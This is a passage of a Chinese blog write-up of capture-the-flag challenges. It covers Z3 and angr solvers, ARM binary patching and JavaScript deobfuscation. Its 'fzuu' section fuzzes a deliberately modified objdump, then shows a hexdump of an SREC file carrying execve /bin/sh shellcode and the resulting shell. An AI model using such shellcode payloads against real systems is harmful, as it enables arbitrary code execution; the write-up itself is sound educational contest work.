class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">134</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">144</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">142</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">100</span>, <span class="number">142</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">142</span>, <span class="number">142</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">59</span>, <span class="number">142</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">coefficients = np.zeros([<span class="number">144</span>, <span class="number">144</span>])   <span class="comment"># each row represents 144 variable</span></span><br><span class="line">variables = [BitVec(<span class="string">&#x27;x_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i), <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">144</span>)]   <span class="comment"># much faster than using Int()...</span></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate the coefficients matrix</span></span><br><span class="line"><span class="comment">#           1</span></span><br><span class="line"><span class="comment">#           2</span></span><br><span class="line"><span class="comment">#       1 2 3 2 1</span></span><br><span class="line"><span class="comment">#           2</span></span><br><span class="line"><span class="comment">#           1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j] = <span class="number">3</span>            <span class="comment"># click this button </span></span><br><span class="line">        <span class="keyword">if</span> j+<span class="number">1</span> &lt; <span class="number">12</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j+<span class="number">1</span>] = <span class="number">2</span>      <span class="comment"># click the next one</span></span><br><span class="line">        <span class="keyword">if</span> j-<span class="number">1</span> &gt;= <span class="number">0</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j-<span class="number">1</span>] = <span class="number">2</span>      <span class="comment"># click the previous one</span></span><br><span class="line">        <span class="keyword">if</span> j+<span class="number">2</span> &lt; <span class="number">12</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j+<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j-<span class="number">2</span> &gt;= <span class="number">0</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][i*<span class="number">12</span>+j-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (i+<span class="number">1</span>) &lt; <span class="number">12</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][(i+<span class="number">1</span>)*<span class="number">12</span>+j] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (i-<span class="number">1</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][(i-<span class="number">1</span>)*<span class="number">12</span>+j] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (i+<span class="number">2</span>) &lt; <span class="number">12</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][(i+<span class="number">2</span>)*<span class="number">12</span>+j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (i-<span class="number">2</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            coefficients[i*<span class="number">12</span>+j][(i-<span class="number">2</span>)*<span class="number">12</span>+j] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">expression = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">144</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">144</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">144</span>):</span><br><span class="line">            expression[i] += <span class="built_in">int</span>(coefficients[i][j]) * variables[j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        s.add(expression[i*<span class="number">12</span>+j] == result[i][j])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>
<p><s>解完之后只要一个一个用手点就好了</s></p>
<h2 id="只读文件系统">只读文件系统</h2>
<p>这个问题一开始想直接绕过<code>chroot</code>，最后以失败告终了，然后就到了看题解“Ohhh”的阶段了</p>
<h2 id="卷王与野生的-GPA">卷王与野生的 GPA</h2>
<p>这个很好玩，直接把ELF拖进IDA发现，有一个<code>decrypt</code>函数在解密<code>flag</code>，其后面跟着的代码和<code>showtext</code>的十分接近（猜测是用来刷新的？），那么只要找一个位置调用一下即可，个人选择的是先patch init里的给球赋值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080004E0 init                                    ; CODE XREF: main:loc_80005DE↓p</span><br><span class="line">.text:080004E0                 MOVS    R2, #1 &lt;--- Patch here</span><br><span class="line">.text:080004E2                 PUSH    &#123;R3-R7,LR&#125;</span><br></pre></td></tr></table></figure>
<p>然后修改一下trickplay</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0800049C                 EXPORT trickplay</span><br><span class="line">.text:0800049C trickplay                               ; CODE XREF: main:loc_80005F8↓p</span><br><span class="line">.text:0800049C                 PUSH    &#123;R4,LR&#125;</span><br><span class="line">.text:0800049E                 LDR     R0, =trick0</span><br><span class="line">.text:080004A0                 BL      decrypt &lt;--- Patch here</span><br></pre></td></tr></table></figure>
<p>至于为什么不直接decrypt，因为这样子可以抛一次球（）<br>
<img src="gpa.png" alt="GPA"></p>
<h2 id="助记词">助记词</h2>
<h3 id="第一顿大餐">第一顿大餐</h3>
<p>注意到延时在<code>equal()</code>中，我们想办法去让这个函数被调用就可以了。数据被储存在<code>HashMap</code>里，假如我们让每一个数据的hash相等，这个时候就需要去判断对应index的数据是否相等，就会调用<code>equal()</code>触发延时，一次发送32条数据，足够完成第一个问题了</p>
<h2 id="minecRaft">minecRaft</h2>
<p>实际上是个逆向题，做的时候直接就去分析js了（（（）））花点时间慢慢分析就好了，以下是一些简单的反混淆</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 这个函数执行输入的处理，将输入字符串切分，四个一组，两两用 code() 进行运算</span></span><br><span class="line">    <span class="comment">// 这里的部分常量是直接在浏览器console里面获得的，实在是没心情看这份代码了（）</span></span><br><span class="line">    <span class="built_in">String</span>.prototype[get_string_from_array(<span class="number">0x1a8</span>)<span class="comment">/*encrypt*/</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> _0x13519e = get_string_from_array,</span><br><span class="line">            new_arr_1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x2</span>),</span><br><span class="line">            new_arr_2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> _0x1bf548 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        plaintext = <span class="built_in">escape</span>(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// input = &#x27;1356853149054377&#x27;</span></span><br><span class="line">        <span class="comment">// new_arr_2[0] = 909456177</span></span><br><span class="line">        <span class="comment">// new_arr_2[1] = 825439544</span></span><br><span class="line">        <span class="comment">// new_arr_2[2] = 892352820</span></span><br><span class="line">        <span class="comment">// new_arr_2[3] = 926364468</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0x0</span>; i &lt; <span class="number">0x4</span>; i++)</span><br><span class="line">            new_arr_2[i] = Str4ToLong(input[<span class="string">&#x27;slice&#x27;</span>](i * <span class="number">0x4</span>, (i + <span class="number">0x1</span>) * <span class="number">0x4</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0x0</span>; i &lt; plaintext[<span class="string">&#x27;length&#x27;</span>]; i += <span class="number">0x8</span>) &#123;</span><br><span class="line">            new_arr_1[<span class="number">0x0</span>] = Str4ToLong(plaintext.slice(i, i + <span class="number">0x4</span>)),</span><br><span class="line">            new_arr_1[<span class="number">0x1</span>] = Str4ToLong(plaintext[<span class="string">&#x27;slice&#x27;</span>](i + <span class="number">0x4</span>, i + <span class="number">0x8</span>)),</span><br><span class="line">            code(new_arr_1, new_arr_2),</span><br><span class="line">            _0x1bf548 += LongToBase16(new_arr_1[<span class="number">0x0</span>]) + LongToBase16(new_arr_1[<span class="number">0x1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c</span></span><br><span class="line">        <span class="keyword">return</span> _0x1bf548;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行输入变换的函数，_0x50051f(0x1aa)的输出就是 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gyflagh</span>(<span class="params">input_flag</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> _0x50051f = _0x22517d;</span><br><span class="line">    <span class="keyword">let</span> _0x3b790d = input_flag[<span class="string">&#x27;encrypt&#x27;</span>](<span class="string">&#x27;1356853149054377&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (_0x3b790d === _0x50051f(<span class="number">0x1aa</span>)) <span class="comment">// 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不难发现，我们只要将<code>code()</code>里的计算给反过来就可以完成了解密了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">input_arr_1, input_arr_2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> value_1 = input_arr_1[<span class="number">0x0</span>], <span class="comment">// 0,1,2,3, str2long</span></span><br><span class="line">        value_2 = input_arr_1[<span class="number">0x1</span>]; <span class="comment">// 4,5,6,7, str2long</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> constant_1 = (<span class="number">0x52cfb2de</span> + <span class="number">0x4b67c6db</span>), <span class="comment">// 2654435769</span></span><br><span class="line">        e1 = constant_1 * <span class="number">0x20</span>;            <span class="comment">// 84941944608</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> v1 = e1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (v1 != <span class="number">0x0</span>) &#123;</span><br><span class="line">        value_2 -= (value_1 &lt;&lt; <span class="number">0x4</span> ^ value_1 &gt;&gt;&gt; <span class="number">0x5</span>) + value_1 ^ v1 + input_arr_2[v1 &gt;&gt;&gt; <span class="number">0xb</span> &amp; <span class="number">0x3</span>];</span><br><span class="line">        v1 -= constant_1;</span><br><span class="line">        value_1 -= (value_2 &lt;&lt; <span class="number">0x4</span> ^ value_2 &gt;&gt;&gt; <span class="number">0x5</span>) + value_2 ^ v1 + input_arr_2[v1 &amp; <span class="number">0x3</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    input_arr_1[<span class="number">0x0</span>] = value_1,</span><br><span class="line">        input_arr_1[<span class="number">0x1</span>] = value_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_arr_1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x2</span>);</span><br><span class="line">new_arr_2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x4</span>);</span><br><span class="line">new_arr_2[<span class="number">0</span>] = <span class="number">909456177</span></span><br><span class="line">new_arr_2[<span class="number">1</span>] = <span class="number">825439544</span></span><br><span class="line">new_arr_2[<span class="number">2</span>] = <span class="number">892352820</span></span><br><span class="line">new_arr_2[<span class="number">3</span>] = <span class="number">926364468</span></span><br><span class="line">res=<span class="string">&quot;&quot;</span></span><br><span class="line">text =<span class="string">&quot;6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c&quot;</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0x0</span>; i &lt; text[<span class="string">&#x27;length&#x27;</span>]; i += <span class="number">16</span>) &#123;</span><br><span class="line">    new_arr_1[<span class="number">0x0</span>] = Base16ToLong(text.slice(i, i + <span class="number">0x8</span>)),</span><br><span class="line">        new_arr_1[<span class="number">0x1</span>] = Base16ToLong(text[<span class="string">&#x27;slice&#x27;</span>](i + <span class="number">0x8</span>, i + <span class="number">16</span>)),</span><br><span class="line">        decode(new_arr_1, new_arr_2),</span><br><span class="line">        res += LongToStr4(new_arr_1[<span class="number">0x0</span>]) + LongToStr4(new_arr_1[<span class="number">0x1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(res);</span><br></pre></td></tr></table></figure>
<p>以上内容直接复制到console里面就能看到答案</p>
<h2 id="fzuu">fzuu</h2>
<p>属于看到题目长度就开始摆烂啥都没做最后发现其实很简单的一个了，首先按照提示用AFL fuzz objdump，大概五六分钟就可以得到一个crash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿k)-[~/Desktop/fzuu]</span><br><span class="line">└─$ hexdump -C out/crashes/id:000001,sig:04,src:000375,op:flip1,pos:2 </span><br><span class="line">00000000  53 31 30 30 30 22 ff ff  33 33 33 33 33 33 33 ff  |S1000&quot;..3333333.|</span><br><span class="line">00000010  30 30 30 1c ec 50 30 c5  c5 c5 c5 c5 b3 c5 c5 c5  |000..P0.........|</span><br><span class="line">00000020  c5 c5 c5 c5 c5 c5 c5 c5  c5 c5 33 33 33 33 33 33  |..........333333|</span><br><span class="line">00000030  00 0d 7f ff 30 30 30 30  16 30 30 30 30 30 30 30  |....0000.0000000|</span><br><span class="line">00000040  ff ff 33 ea 00 1c e8 49                           |..3....I|</span><br><span class="line">00000048</span><br></pre></td></tr></table></figure>
<p>连上调试器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ set args -d out/crashes/id:000001,sig:04,src:000375,op:flip1,pos:2</span><br><span class="line"></span><br><span class="line">.........</span><br><span class="line"></span><br><span class="line">RBP: 0x7fffffffd970 --&gt; 0x7fffffffdac0 --&gt; 0x7fffffffdb00 --&gt; 0x7fffffffdca0 --&gt; 0x7fffffffdcd0 --&gt; 0x7fffffffdd10 (--&gt; ...)</span><br><span class="line">RSP: 0x7fffffffd8c8 --&gt; 0x55555564d8b5 (&lt;srec_scan_helper+117&gt;:	nop)</span><br><span class="line">RIP: 0x7fffffffd900 --&gt; 0x333333333333ffff </span><br></pre></td></tr></table></figure>
<p>注意到RIP，可以发现，它大概是直接执行了这个文件的ff ff  33 33 33 33 33 33 33处的内容，直接找一个shellcode复制进去试试(<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/files/shellcode-806.php">http://shell-storm.org/shellcode/files/shellcode-806.php</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿k)-[~/Desktop/fzuu]</span><br><span class="line">└─$ hexdump -C payload</span><br><span class="line">00000000  53 31 30 30 30 22 31 c0  48 bb d1 9d 96 91 d0 8c  |S1000&quot;1.H.......|</span><br><span class="line">00000010  97 ff 48 f7 db 53 54 5f  99 52 57 54 5e b0 3b 0f  |..H..ST_.RWT^.;.|</span><br><span class="line">00000020  05                                                |.|</span><br><span class="line">00000021</span><br><span class="line"></span><br><span class="line"># shellcode starts from 31 c0 48...</span><br><span class="line"></span><br><span class="line">┌──(kali㉿k)-[~/Desktop/fzuu]</span><br><span class="line">└─$ ./objdump_afl -d payload</span><br><span class="line">$ uname -a</span><br><span class="line">Linux bad 5.10.0-kali7-amd64 #1 SMP Debian 5.10.28-1kali1 (2021-04-12) x86_64 GNU/Linux</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>
<p>然后就，结束了，就很简单，既然都到这里了，那我们不妨简单看一下为什么会出现这样的问题，直接定位到<code>srec_scan_helper</code>看看先<br>
<img src="r2.png" alt="srec_scan_helper"><br>
很明显，从文件中读入数据，然后一个<code>rdx()</code>直接执行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000FA329 loc_FA329:                              ; CODE XREF: srec_scan+96D↑j</span><br><span class="line">.text:00000000000FA329                 cmp     dword ptr [rbp-114h], 0FFFFFFFEh</span><br><span class="line">.text:00000000000FA330                 jnz     short loc_FA367</span><br></pre></td></tr></table></figure>
<p>然而在前面的<code>case</code>中，<code>bytes</code>从1减到0又-2了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">check_sum += HEX (data);</span><br><span class="line">address = (address &lt;&lt; <span class="number">8</span>) | HEX (data);</span><br><span class="line">data += <span class="number">2</span>;</span><br><span class="line">check_sum += HEX (data);</span><br><span class="line">address = (address &lt;&lt; <span class="number">8</span>) | HEX (data);</span><br><span class="line">data += <span class="number">2</span>;</span><br><span class="line">bytes -= <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>，这里正好满足条件</p>
<h2 id="外星人的音游掌机">外星人的音游掌机</h2>
<p>根据提示，去装上icebox等等相关工具，开始分析</p>
<h2 id="超-OI-的-Writeup-模拟器">超 OI 的 Writeup 模拟器</h2>
<h3 id="果然还是逆向比较简单，这次没人两小时手做了吧">果然还是逆向比较简单，这次没人两小时手做了吧</h3>
<p>第一问可以手动还原，不难发现，用来计算结果的循环其循环次数只和输入的前两个参数有关，并且前两个参数都是常量，那么我们就能从结果为0一步一步往上倒推得到答案</p>
<p>当然也可以直接符号执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>():</span></span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;./0.bin&#x27;</span>)</span><br><span class="line">    flag_chars = [claripy.BVS(<span class="string">&#x27;flag_%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    flag = claripy.Concat(*flag_chars+[claripy.BVV(<span class="string">b&#x27;\n&#x27;</span>)])</span><br><span class="line"></span><br><span class="line">    init_state = proj.factory.entry_state(stdin=flag)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> flag_chars:</span><br><span class="line">        init_state.solver.add(k &lt;= <span class="number">126</span>)</span><br><span class="line">        init_state.solver.add(k &gt;= <span class="number">35</span>)</span><br><span class="line"></span><br><span class="line">    simulation = proj.factory.simgr(init_state)</span><br><span class="line">    simulation.explore(find=<span class="keyword">lambda</span> s: <span class="string">b&quot;Correct code&quot;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> solution <span class="keyword">in</span> simulation.found:</span><br><span class="line">        <span class="built_in">print</span>(solution.posix.dumps(<span class="number">0</span>), solution.posix.dumps(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_key()</span><br></pre></td></tr></table></figure>
<p>以上脚本对于前两个问题都可以比较快求出解，摆烂摆出前两题。到第三问跑了一会实在不行了，选择放弃！</p>
<p><em>结束之后发现好像要写比较多代码的题目都懒得做了直接跳过了（）</em></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
      <!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Home</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../index.html">Home</a>
        </span>
      </li><!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Writing</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../archives/">Writing</a>
        </span>
      </li><!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Projects</title>
